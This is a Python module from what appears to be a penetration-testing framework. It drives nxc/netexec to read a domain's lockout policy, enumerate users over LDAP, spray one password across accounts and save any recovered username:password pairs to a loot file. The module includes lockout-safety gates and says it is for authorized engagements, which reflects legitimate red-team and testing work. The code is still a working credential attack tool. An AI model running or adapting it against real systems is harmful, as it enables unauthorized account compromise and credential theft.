"""Password spraying - the gated orchestration (intrusive, opt-in).

Like `poison`, this is *not* part of `scan` and never runs by default: spraying can lock out
accounts (a denial of service against the client). It drives nxc in two phases - read the
lockout policy + user list, then spray one password `--continue-on-success` - and refuses to
proceed when it cannot prove the spray is lockout-safe.

Design mirrors poison.py: the pure parsers / safety math / findings live in engines/spray.py;
this module is the impure orchestration. The nxc boundary is a single injectable `nxc_run(argv)`
callable, so `run_spray` unit-tests with no nxc/DC.

Two safety gates the CLI layers on top (see cmd_spray):
  * a safety refusal can only be overridden with BOTH --force AND a second, distinct typed
    "FORCE" confirmation (`confirm_force`) - so --force + --yes together can never silently
    skip both checks;
  * the danger banner is always printed (to stderr), even in scripted --yes/--force mode.

Authorized, in-scope engagements only.
"""
from __future__ import annotations

import os
import shutil
import subprocess
from dataclasses import dataclass, field
from typing import Callable, Optional

from .engines.ldap import parse_users
from .engines.spray import (
    build_findings, is_spray_safe, parse_pass_pol, parse_spray_hits, safe_budget, spray_argv,
)
from .events import Event, EventBus, EventKind
from .findings import Report


@dataclass
class SprayResult:
    hits: list = field(default_factory=list)     # list[SprayHit]
    tested: int = 0
    refused: bool = False
    reason: str = ""                             # "unknown-policy" | "lockout-risk" | "no-users"


# --------------------------------------------------------------------------- #
# Impure seam - nxc invocation (injectable)                                    #
# --------------------------------------------------------------------------- #
def _default_nxc_run(argv: list[str], *, timeout: int = 300) -> str:
    exe = shutil.which("nxc") or shutil.which("netexec")
    if not exe:
        return ""
    try:
        proc = subprocess.run([exe] + argv, capture_output=True, text=True, timeout=timeout)
    except (subprocess.TimeoutExpired, OSError):
        return ""
    return (proc.stdout or "") + "\n" + (proc.stderr or "")


def _recon_auth(username, password, nthash, kerberos, domain) -> list[str]:
    """nxc auth args for the recon phase (tester creds reading pass-pol / users)."""
    args = ["-u", username or ""]
    if nthash:
        args += ["-H", nthash]
    else:
        args += ["-p", password or ""]
    if kerberos:
        args += ["-k"]
    if domain:
        args += ["-d", domain]
    return args


def _write_loot(path: str, lines: list[str]) -> None:
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines) + ("\n" if lines else ""))


def _count_lines(path: str) -> int:
    try:
        with open(path, encoding="utf-8") as fh:
            return sum(1 for ln in fh if ln.strip())
    except OSError:
        return 0


def _emit(bus: Optional[EventBus], kind: EventKind, **data) -> None:
    if bus is not None:
        bus.publish(Event(kind=kind, data=data, engine="spray"))


# --------------------------------------------------------------------------- #
# Orchestration                                                                #
# --------------------------------------------------------------------------- #
def run_spray(
    host: str,
    password: str,
    *,
    username: Optional[str] = None,
    auth_password: Optional[str] = None,
    nthash: Optional[str] = None,
    domain: Optional[str] = None,
    kerberos: bool = False,
    user_file: Optional[str] = None,
    margin: int = 1,
    force: bool = False,
    confirm_force: Optional[Callable[[str], bool]] = None,
    bus: Optional[EventBus] = None,
    engagement: str = "REDNESS password spray",
    loot_dir: str = "loot",
    nxc_run: Optional[Callable[[list[str]], str]] = None,
) -> tuple[Report, SprayResult]:
    """Read the lockout policy, refuse-or-proceed, spray one password, build a Report.

    A safety refusal is overridden only when BOTH `force` is set AND `confirm_force(reason)`
    returns True (the CLI wires that to a typed "FORCE" prompt). `nxc_run` is the injectable
    nxc boundary for tests. Recovered creds are stored to loot and ride in `meta["credentials"]`.
    """
    nxc_run = nxc_run or _default_nxc_run
    report = Report(engagement=engagement, target=f"spray {host}")
    root = f"spray:{host}"
    _emit(bus, EventKind.STATUS, message=f"spray start on {host} (1 password)")
    _emit(bus, EventKind.NODE, id=root, label=f"spray {host}", type="host")

    credentialed = bool(username and (auth_password or nthash or kerberos))
    policy = None

    def _allow(reason: str) -> bool:
        # override a safety refusal only with BOTH --force and a positive FORCE confirmation
        return force and confirm_force is not None and confirm_force(reason)

    if credentialed:
        auth = _recon_auth(username, auth_password, nthash, kerberos, domain)
        policy = parse_pass_pol(nxc_run(["smb", host] + auth + ["--pass-pol"]))
        _emit(bus, EventKind.STATUS,
              message=f"policy: lockout threshold {policy.threshold}, safe budget "
                      f"{safe_budget(policy, margin)}")
        if user_file is None:
            users = parse_users(nxc_run(["ldap", host] + auth + ["--users"]))
            if users:
                user_file = os.path.join(loot_dir, "spray_users.txt")
                _write_loot(user_file, users)

    # --- safety gate (refuse unless force + FORCE-confirmed) ---
    if policy is None:
        if not _allow("unknown-policy"):
            _emit(bus, EventKind.STATUS,
                  message="refused: lockout policy unknown (uncredentialed) - needs --force + FORCE")
            return report, SprayResult(refused=True, reason="unknown-policy")
    elif not is_spray_safe(policy, 1, margin):
        if not _allow("lockout-risk"):
            _emit(bus, EventKind.STATUS,
                  message=f"refused: lockout threshold {policy.threshold} too low - needs --force + FORCE")
            return report, SprayResult(refused=True, reason="lockout-risk")

    if not user_file:
        _emit(bus, EventKind.STATUS, message="no user list - pass --user-file (required uncredentialed)")
        return report, SprayResult(refused=True, reason="no-users")

    # --- spray ---
    _emit(bus, EventKind.STATUS, message=f"spraying 1 password across users in {user_file}")
    hits = parse_spray_hits(nxc_run(spray_argv(host, user_file, password)))
    report.findings = build_findings(hits, policy, host=host)
    for f in report.findings:
        _emit(bus, EventKind.FINDING, finding=f.to_dict())
    for h in hits:
        _emit(bus, EventKind.NODE, id=h.username, label=h.username, type="user")
        _emit(bus, EventKind.EDGE, src=root, dst=h.username,
              label="sprayed (admin)" if h.admin else "sprayed")
    if hits:
        _write_loot(os.path.join(loot_dir, "spray_hits.txt"),
                    [f"{h.username}:{h.password}" + (" (Pwn3d!)" if h.admin else "") for h in hits])
    _emit(bus, EventKind.DONE, engine="spray")
    return report, SprayResult(hits=hits, tested=_count_lines(user_file), refused=False)
